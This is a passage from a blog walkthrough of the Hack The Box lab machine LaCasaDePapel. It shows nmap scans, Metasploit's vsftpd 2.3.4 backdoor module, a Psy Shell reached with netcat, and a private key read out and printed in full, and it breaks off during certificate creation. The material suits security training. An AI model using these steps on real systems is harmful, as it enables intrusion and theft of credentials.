<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - LaCasaDePapel - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for LaCasaDePapel from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - LaCasaDePapel">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/lacasadepapel/">


  <meta property="og:description" content="My write-up / walkthrough for LaCasaDePapel from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - LaCasaDePapel">
  <meta name="twitter:description" content="My write-up / walkthrough for LaCasaDePapel from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/lacasadepapel/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-07-27T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/lacasadepapel/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - LaCasaDePapel">
    <meta itemprop="description" content="Hack The Box - LaCasaDePapel">
    <meta itemprop="datePublished" content="2019-07-27T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/lacasadepapel/" class="u-url" itemprop="url">Hack The Box - LaCasaDePapel
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-07-27T07:00:00+02:00">July 27, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          9 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---lacasadepapel">Hack The Box - LaCasaDePapel</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#http">HTTP</a></li>
<li><a href="#vsftpd-234-psy-shell">vsftpd 2.3.4, Psy Shell</a></li>
<li><a href="#client-certificate-generation">Client Certificate Generation</a></li>
<li><a href="#path-traversal-arbitrary-file-download-user-flag">Path Traversal, Arbitrary File Download, User Flag</a></li>
<li><a href="#privilege-escalation-root-flag">Privilege Escalation, Root Flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---lacasadepapel">Hack The Box - LaCasaDePapel</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today LaCasaDePapel retired and here’s my write-up about it. It was an easy interesting box, more of a ctf challenge than a realistic scenario but I still enjoyed it. It’s a Linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.131</code>, I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">lacasadepapel.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/lacasadepapel/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports and services :
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC lacasadepapel.htb</code>
<br><img src="/images/hackthebox/lacasadepapel/1.png" alt="" class="align-center"><br><br>
We have <code class="language-plaintext highlighter-rouge">http</code> on port 80. <code class="language-plaintext highlighter-rouge">https</code> on port 443, <code class="language-plaintext highlighter-rouge">ftp</code> on port 21 and <code class="language-plaintext highlighter-rouge">ssh</code> on port 22.<br>
Anonymous authentication wasn’t allowed on <code class="language-plaintext highlighter-rouge">ftp</code> so I checked <code class="language-plaintext highlighter-rouge">http</code> and <code class="language-plaintext highlighter-rouge">https</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel# ftp lacasadepapel.htb
Connected to lacasadepapel.htb.
220 (vsFTPd 2.3.4)
Name (lacasadepapel.htb:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp&gt; 
</code></pre></div></div>

<h2 id="http">HTTP</h2>
<p><code class="language-plaintext highlighter-rouge">http://lacasadepapel.htb</code>
<br><img src="/images/hackthebox/lacasadepapel/2.png" alt="" class="align-center"><br><br>
We see an image of the characters from <a href="https://www.imdb.com/title/tt6468322/" target="_blank" rel="noopener noreferrer">LaCasaDePapel</a> (TV show) and a QR code for <code class="language-plaintext highlighter-rouge">OTP</code>, I scanned it with <a href="https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&amp;hl=en" target="_blank" rel="noopener noreferrer">Google Authenticator</a> on my phone :
<br><img src="/images/hackthebox/lacasadepapel/3.png" alt="" class="align-center"><br><br>
As you can see I had to refresh it manually while other tokens refreshed automatically, no idea why but anyway I took the <code class="language-plaintext highlighter-rouge">OTP</code> and used <code class="language-plaintext highlighter-rouge">test@test.com</code> as email :
<br><img src="/images/hackthebox/lacasadepapel/4.png" alt="" class="align-center"><br><br>
Then nothing happened, I just got the same page back again. I tried <code class="language-plaintext highlighter-rouge">gobuster</code> to see if I can find any sub directories and I didn’t get anything useful. Let’s check <code class="language-plaintext highlighter-rouge">https</code>.<br>
<code class="language-plaintext highlighter-rouge">https://lacasadepapel.htb</code>
<br><img src="/images/hackthebox/lacasadepapel/5.png" alt="" class="align-center"><br><br>
The same background with an error message saying : “Sorry, but you need to provide a client certificate to continue.”</p>

<h2 id="vsftpd-234-psy-shell">vsftpd 2.3.4, Psy Shell</h2>
<p>After hitting dead ends with web, I checked the <code class="language-plaintext highlighter-rouge">ftp</code> service again, the version was <code class="language-plaintext highlighter-rouge">vsftpd 2.3.4</code> (from the <code class="language-plaintext highlighter-rouge">nmap</code> scan) so I searched for exploits :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel# searchsploit vsftpd 2.3.4
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                            |  Path
                                                                                                                                                                          | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                    | exploits/unix/remote/17491.rb
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
</code></pre></div></div>
<p>Command Execution and there is a <code class="language-plaintext highlighter-rouge">metasploit</code> module for it, but the exploit didn’t work :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 &gt; search vsftpd 2.3.4

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   1  auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials
   2  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution
   3  exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   4  exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options 

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 10.10.10.131
rhosts =&gt; 10.10.10.131
msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit 

[*] 10.10.10.131:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.131:21 - USER: 331 Please specify the password.
[+] 10.10.10.131:21 - Backdoor service has been spawned, handling...
[-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell
[*] Exploit completed, but no session was created.
msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; 
</code></pre></div></div>
<p>Apparently there was another service running on port 6200, a quick <code class="language-plaintext highlighter-rouge">nmap</code> scan shows that the port is open :
<br><img src="/images/hackthebox/lacasadepapel/6.png" alt="" class="align-center"><br><br>
So I connected to that port with <code class="language-plaintext highlighter-rouge">nc</code> to see what’s there :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel# nc lacasadepapel.htb 6200
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
</code></pre></div></div>
<p>The banner says <code class="language-plaintext highlighter-rouge">Psy Shell v0.9.9</code>, I didn’t know what <code class="language-plaintext highlighter-rouge">Psy Shell</code> was but a quick search and I found the <a href="https://psysh.org/" target="_blank" rel="noopener noreferrer">website</a>. It’s a shell used for interactive <code class="language-plaintext highlighter-rouge">php</code> debugging and we can use it to execute <code class="language-plaintext highlighter-rouge">php</code>.<br>
I tried to execute system commands but I couldn’t :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec</span><span class="p">(</span><span class="s2">"whoami"</span><span class="p">)</span>
<span class="no">PHP</span> <span class="nc">Fatal</span> <span class="n">error</span><span class="o">:</span>  <span class="nc">Call</span> <span class="n">to</span> <span class="n">undefined</span> <span class="k">function</span> <span class="n">exec</span><span class="p">()</span> <span class="kt">in</span> <span class="nc">Psy</span> <span class="nc">Shell</span> <span class="n">code</span> <span class="n">on</span> <span class="n">line</span> <span class="mi">1</span>
<span class="nb">system</span><span class="p">(</span><span class="s2">"whoami"</span><span class="p">)</span>
<span class="no">PHP</span> <span class="nc">Fatal</span> <span class="n">error</span><span class="o">:</span>  <span class="nc">Call</span> <span class="n">to</span> <span class="n">undefined</span> <span class="k">function</span> <span class="n">system</span><span class="p">()</span> <span class="kt">in</span> <span class="nc">Psy</span> <span class="nc">Shell</span> <span class="n">code</span> <span class="n">on</span> <span class="n">line</span> <span class="mi">1</span>
</code></pre></div></div>
<p>I tried to use <code class="language-plaintext highlighter-rouge">scandir()</code> to see the current directory listing and it worked :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">scandir</span><span class="p">(</span><span class="s2">"."</span><span class="p">)</span>
<span class="o">=&gt;</span> <span class="p">[</span>
	 <span class="s2">"."</span><span class="p">,</span>
	 <span class="s2">".."</span><span class="p">,</span>
	 <span class="s2">".DS_Store"</span><span class="p">,</span>
	 <span class="s2">"._.DS_Store"</span><span class="p">,</span>
	 <span class="s2">"bin"</span><span class="p">,</span>
	 <span class="s2">"boot"</span><span class="p">,</span>
	 <span class="s2">"dev"</span><span class="p">,</span>
	 <span class="s2">"etc"</span><span class="p">,</span>
	 <span class="s2">"home"</span><span class="p">,</span>
	 <span class="s2">"lib"</span><span class="p">,</span>
	 <span class="s2">"lost+found"</span><span class="p">,</span>
	 <span class="s2">"media"</span><span class="p">,</span>
	 <span class="s2">"mnt"</span><span class="p">,</span>
	 <span class="s2">"opt"</span><span class="p">,</span>
	 <span class="s2">"proc"</span><span class="p">,</span>
	 <span class="s2">"root"</span><span class="p">,</span>
	 <span class="s2">"run"</span><span class="p">,</span>
	 <span class="s2">"sbin"</span><span class="p">,</span>
	 <span class="s2">"srv"</span><span class="p">,</span>
	 <span class="s2">"swap"</span><span class="p">,</span>
	 <span class="s2">"sys"</span><span class="p">,</span>
	 <span class="s2">"tmp"</span><span class="p">,</span>
	 <span class="s2">"usr"</span><span class="p">,</span>
	 <span class="s2">"var"</span><span class="p">,</span>                           
   <span class="p">]</span>
</code></pre></div></div>
<p>I could list the directories in <code class="language-plaintext highlighter-rouge">/home</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">scandir</span><span class="p">(</span><span class="s2">"home/"</span><span class="p">)</span>
<span class="o">=&gt;</span> <span class="p">[</span>
     <span class="s2">"."</span><span class="p">,</span>
     <span class="s2">".."</span><span class="p">,</span>
     <span class="s2">"berlin"</span><span class="p">,</span>
     <span class="s2">"dali"</span><span class="p">,</span>
     <span class="s2">"nairobi"</span><span class="p">,</span>
     <span class="s2">"oslo"</span><span class="p">,</span>
     <span class="s2">"professor"</span><span class="p">,</span>
   <span class="p">]</span>
</code></pre></div></div>
<p>Now we know the users on the box : <code class="language-plaintext highlighter-rouge">berlin</code>,<code class="language-plaintext highlighter-rouge">dali</code>,<code class="language-plaintext highlighter-rouge">nairobi</code>,<code class="language-plaintext highlighter-rouge">oslo</code> and <code class="language-plaintext highlighter-rouge">professor</code>.<br>
I found the user flag in <code class="language-plaintext highlighter-rouge">/home/berlin</code>, however I got permission denied when I tried to read it :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">scandir</span><span class="p">(</span><span class="s2">"home/berlin"</span><span class="p">)</span>
<span class="o">=&gt;</span> <span class="p">[</span>
     <span class="s2">"."</span><span class="p">,</span>
     <span class="s2">".."</span><span class="p">,</span>
     <span class="s2">".ash_history"</span><span class="p">,</span>
     <span class="s2">".ssh"</span><span class="p">,</span>
     <span class="s2">"downloads"</span><span class="p">,</span>
     <span class="s2">"node_modules"</span><span class="p">,</span>
     <span class="s2">"server.js"</span><span class="p">,</span>
     <span class="s2">"user.txt"</span><span class="p">,</span>
   <span class="p">]</span>
<span class="nb">readfile</span><span class="p">(</span><span class="s2">"home/berlin/user.txt"</span><span class="p">)</span>
<span class="no">PHP</span> <span class="nc">Warning</span><span class="o">:</span>  <span class="nb">readfile</span><span class="p">(</span><span class="n">home</span><span class="o">/</span><span class="n">berlin</span><span class="o">/</span><span class="n">user</span><span class="mf">.</span><span class="n">txt</span><span class="p">)</span><span class="o">:</span> <span class="n">failed</span> <span class="n">to</span> <span class="n">open</span> <span class="n">stream</span><span class="o">:</span> <span class="nc">Permission</span> <span class="n">denied</span> <span class="n">in</span> <span class="n">phar</span><span class="o">://</span><span class="k">eval</span><span class="p">()</span><span class="err">'</span><span class="n">d</span> <span class="n">code</span> <span class="n">on</span> <span class="n">line</span> <span class="mi">1</span>
</code></pre></div></div>
<p>Same for <code class="language-plaintext highlighter-rouge">.ssh</code>, after a lot of failed attempts to get <code class="language-plaintext highlighter-rouge">RCE</code>, I looked at the <code class="language-plaintext highlighter-rouge">help</code> menu to see if there’s anything helpful:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>help
  help       Show a list of commands. Type `help [foo]` for information about [foo].                                Aliases: ?  
  ls         List local, instance or class variables, methods and constants.                                        Aliases: list, dir
  dump       Dump an object or primitive.
  doc        Read the documentation for an object, class, constant, method or property.                             Aliases: rtfm, man  
  show       Show the code for an object, class, constant, method or property.
  wtf        Show the backtrace of the most recent exception.                                                       Aliases: last-exception, wtf?
  whereami   Show where you are in the code.
  throw-up   Throw an exception or error out of the Psy Shell.
  timeit     Profiles with a timer.
  trace      Show the current call stack.
  buffer     Show (or clear) the contents of the code input buffer.                                                 Aliases: buf
  clear      Clear the Psy Shell screen.
  edit       Open an external editor. Afterwards, get produced code in input buffer.
  sudo       Evaluate PHP code, bypassing visibility restrictions.
  history    Show the Psy Shell history.                                                                            Aliases: hist
  exit       End the current session and return to caller.                                                          Aliases: quit, q
</code></pre></div></div>
<p>I used <code class="language-plaintext highlighter-rouge">ls</code> to see what variables are there :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls
Variables: $tokyo
</code></pre></div></div>
<p>There was only one variable called <code class="language-plaintext highlighter-rouge">tokyo</code> , let’s check that variable:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">show</span> <span class="nv">$tokyo</span>
  <span class="o">&gt;</span> <span class="mi">2</span><span class="o">|</span> <span class="kd">class</span> <span class="nc">Tokyo</span> <span class="p">{</span>
    <span class="mi">3</span><span class="o">|</span>  <span class="k">private</span> <span class="k">function</span> <span class="n">sign</span><span class="p">(</span><span class="nv">$caCert</span><span class="p">,</span><span class="nv">$userCsr</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">4</span><span class="o">|</span>          <span class="nv">$caKey</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/home/nairobi/ca.key'</span><span class="p">);</span>
    <span class="mi">5</span><span class="o">|</span>          <span class="nv">$userCert</span> <span class="o">=</span> <span class="nb">openssl_csr_sign</span><span class="p">(</span><span class="nv">$userCsr</span><span class="p">,</span> <span class="nv">$caCert</span><span class="p">,</span> <span class="nv">$caKey</span><span class="p">,</span> <span class="mi">365</span><span class="p">,</span> <span class="p">[</span><span class="s1">'digest_alg'</span><span class="o">=&gt;</span><span class="s1">'sha256'</span><span class="p">]);</span>
    <span class="mi">6</span><span class="o">|</span>          <span class="nb">openssl_x509_export</span><span class="p">(</span><span class="nv">$userCert</span><span class="p">,</span> <span class="nv">$userCertOut</span><span class="p">);</span>
    <span class="mi">7</span><span class="o">|</span>          <span class="k">return</span> <span class="nv">$userCertOut</span><span class="p">;</span>
    <span class="mi">8</span><span class="o">|</span>  <span class="p">}</span>
    <span class="mi">9</span><span class="o">|</span> <span class="p">}</span>
</code></pre></div></div>
<p>The function <code class="language-plaintext highlighter-rouge">sign()</code> is using the private key <code class="language-plaintext highlighter-rouge">/home/nairobi/ca.key</code>, we can grab that key and create a client certificate to access the <code class="language-plaintext highlighter-rouge">https</code> service we couldn’t access before.<br></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/home/nairobi/ca.key'</span><span class="p">);</span>
<span class="o">=&gt;</span> <span class="s2">"""
   -----BEGIN PRIVATE KEY-----</span><span class="se">\n</span><span class="s2">
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb</span><span class="se">\n</span><span class="s2">
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/</span><span class="se">\n</span><span class="s2">
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl</span><span class="se">\n</span><span class="s2">
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M</span><span class="se">\n</span><span class="s2">
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp</span><span class="se">\n</span><span class="s2">
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us</span><span class="se">\n</span><span class="s2">
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V</span><span class="se">\n</span><span class="s2">
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89</span><span class="se">\n</span><span class="s2">
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ</span><span class="se">\n</span><span class="s2">
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+</span><span class="se">\n</span><span class="s2">
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr</span><span class="se">\n</span><span class="s2">
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd</span><span class="se">\n</span><span class="s2">
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og</span><span class="se">\n</span><span class="s2">
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE</span><span class="se">\n</span><span class="s2">
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn</span><span class="se">\n</span><span class="s2">
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH</span><span class="se">\n</span><span class="s2">
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y</span><span class="se">\n</span><span class="s2">
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI</span><span class="se">\n</span><span class="s2">
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2</span><span class="se">\n</span><span class="s2">
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/</span><span class="se">\n</span><span class="s2">
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC</span><span class="se">\n</span><span class="s2">
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M</span><span class="se">\n</span><span class="s2">
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM</span><span class="se">\n</span><span class="s2">
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR</span><span class="se">\n</span><span class="s2">
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc</span><span class="se">\n</span><span class="s2">
   53udBEzjt3WPqYGkkDknVhjD</span><span class="se">\n</span><span class="s2">
   -----END PRIVATE KEY-----</span><span class="se">\n</span><span class="s2">
   """</span>
</code></pre></div></div>

<h2 id="client-certificate-generation">Client Certificate Generation</h2>
<p>First, we will create a certificate signing request (<code class="language-plaintext highlighter-rouge">CSR</code>) :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# cat ca.key
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
